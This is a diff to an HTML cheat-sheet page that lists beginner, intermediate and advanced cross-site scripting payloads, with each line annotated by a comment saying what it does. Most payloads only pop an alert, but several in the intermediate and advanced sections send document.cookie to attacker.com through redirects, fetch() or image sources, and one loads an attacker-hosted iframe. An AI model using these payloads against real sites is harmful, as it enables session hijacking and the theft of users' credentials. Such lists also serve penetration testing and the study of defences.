@@ -13,49 +13,49 @@
     <div class="payload-section">
       <h2>Beginner XSS Payloads</h2>
       <pre><code>
-&lt;script&gt;alert('XSS')&lt;/script&gt;
-&lt;img src="x" onerror="alert('XSS')"&gt;
-&lt;svg onload="alert('XSS')"&gt;&lt;/svg&gt;
-&lt;a href="javascript:alert('XSS')"&gt;Click me&lt;/a&gt;
-&lt;body onload="alert('XSS')"&gt;
-&lt;input type="text" autofocus onfocus="alert('XSS')"&gt;
-&lt;iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt;&lt;/iframe&gt;
-&lt;input type="text" value="&lt;img src=x onerror=alert('XSS')"&gt;
+&lt;script&gt;alert('XSS')&lt;/script&gt; <!-- Basic alert -->
+&lt;img src="x" onerror="alert('XSS')"&gt; <!-- Alert triggered by image loading error -->
+&lt;svg onload="alert('XSS')"&gt;&lt;/svg&gt; <!-- SVG image onload event -->
+&lt;a href="javascript:alert('XSS')"&gt;Click me&lt;/a&gt; <!-- Anchor tag with JavaScript link -->
+&lt;body onload="alert('XSS')"&gt; <!-- Body onload event -->
+&lt;input type="text" autofocus onfocus="alert('XSS')"&gt; <!-- Input autofocus event -->
+&lt;iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt;&lt;/iframe&gt; <!-- Base64-encoded iframe payload -->
+&lt;input type="text" value="&lt;img src=x onerror=alert('XSS')"&gt; <!-- Input value with payload -->
       </code></pre>
     </div>
     
     <div class="payload-section">
       <h2>Intermediate XSS Payloads</h2>
       <pre><code>
-&lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;
-&lt;iframe src="http://attacker.com/malicious.html"&gt;&lt;/iframe&gt;
-&lt;img src=x onerror=alert(document.cookie)&gt;
-&lt;input type="text" onfocus="alert(document.cookie)"&gt;
-&lt;img src="javascript:alert('XSS')"&gt;
-&lt;video&gt;&lt;source onerror="alert('XSS')"&gt;&lt;/video&gt;
-&lt;body onload="alert(document.cookie)"&gt;
-&lt;img src=x: onerror=javascript:alert('XSS')&gt;
-&lt;img src="x:x" onerror="alert('XSS')"&gt;
-&lt;img src="x" onerror="document.location='http://attacker.com/log.php?data='+document.cookie"&gt;
+&lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt; <!-- Steal cookies -->
+&lt;iframe src="http://attacker.com/malicious.html"&gt;&lt;/iframe&gt; <!-- Load external content -->
+&lt;img src=x onerror=alert(document.cookie)&gt; <!-- Alert triggered by image loading error -->
+&lt;input type="text" onfocus="alert(document.cookie)"&gt; <!-- Alert triggered by input focus event -->
+&lt;img src="javascript:alert('XSS')"&gt; <!-- Alert triggered by inline JavaScript -->
+&lt;video&gt;&lt;source onerror="alert('XSS')"&gt;&lt;/video&gt; <!-- Alert triggered by video source error -->
+&lt;body onload="alert(document.cookie)"&gt; <!-- Alert triggered by body onload event -->
+&lt;img src=x: onerror=javascript:alert('XSS')&gt; <!-- Alert triggered by image source error -->
+&lt;img src="x:x" onerror="alert('XSS')"&gt; <!-- Alert triggered by invalid image source -->
+&lt;img src="x" onerror="document.location='http://attacker.com/log.php?data='+document.cookie"&gt; <!-- Log data to attacker's server -->
       </code></pre>
     </div>
     
     <div class="payload-section">
       <h2>Advanced XSS Payloads</h2>
       <pre><code>
-&lt;script&gt;fetch('http://attacker.com/steal.php?cookie='+document.cookie)&lt;/script&gt;
-&lt;video&gt;&lt;source onerror="alert('XSS')"&gt;&lt;/video&gt;
-&lt;marquee onstart=alert('XSS')&gt;XSS&lt;/marquee&gt;
-&lt;svg/onload=alert('XSS')&gt;
-&lt;input type="text" value="" onmouseover="alert('XSS')"&gt;
-&lt;script&gt;document.location='http://attacker.com/log.php?data='+document.cookie&lt;/script&gt;
-&lt;input type="text" autofocus onfocus="alert(1)"&gt;
-&lt;iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;/iframe&gt;
-&lt;style&gt;body{background:url('javascript:alert(1)')}&lt;/style&gt;
-&lt;img src=1 onerror=this.src='//attacker.com/pwned?c='+document.cookie&gt;
-&lt;details open ontoggle=alert(1)&gt;&lt;/details&gt;
-&lt;template&gt;&lt;content onresize=alert(1)&gt;&lt;/template&gt;
-&lt;math&gt;&lt;maction actiontype=toggle&gt;&lt;mpadded&gt;&lt;span onmouseup="alert(1)"&gt;X&lt;/span&gt;&lt;/mpadded&gt;&lt;/maction&gt;&lt;/math&gt;
+&lt;script&gt;fetch('http://attacker.com/steal.php?cookie='+document.cookie)&lt;/script&gt; <!-- Fetch and steal cookies -->
+&lt;video&gt;&lt;source onerror="alert('XSS')"&gt;&lt;/video&gt; <!-- Alert triggered by video source error -->
+&lt;marquee onstart=alert('XSS')&gt;XSS&lt;/marquee&gt; <!-- Marquee tag with alert -->
+&lt;svg/onload=alert('XSS')&gt; <!-- SVG onload event with alert -->
+&lt;input type="text" value="" onmouseover="alert('XSS')"&gt; <!-- Alert triggered by mouseover event -->
+&lt;script&gt;document.location='http://attacker.com/log.php?data='+document.cookie&lt;/script&gt; <!-- Log data to attacker's server -->
+&lt;input type="text" autofocus onfocus="alert(1)"&gt; <!-- Autofocus event with alert -->
+&lt;iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;/iframe&gt; <!-- srcdoc attribute with alert -->
+&lt;style&gt;body{background:url('javascript:alert(1)')}&lt;/style&gt; <!-- Background with inline JavaScript -->
+&lt;img src=1 onerror=this.src='//attacker.com/pwned?c='+document.cookie&gt; <!-- Load attacker's content -->
+&lt;details open ontoggle=alert(1)&gt;&lt;/details&gt; <!-- Details tag with alert on toggle -->
+&lt;template&gt;&lt;content onresize=alert(1)&gt;&lt;/template&gt; <!-- Template tag with alert on resize -->
+&lt;math&gt;&lt;maction actiontype=toggle&gt;&lt;mpadded&gt;&lt;span onmouseup="alert(1)"&gt;X&lt;/span&gt;&lt;/mpadded&gt;&lt;/maction&gt;&lt;/math&gt; <!-- Math tag with alert on mouseup -->
       </code></pre>
     </div>
     
@@ -65,3 +65,6 @@
 </footer>
 </body>
 </html>
+
+    
+ 
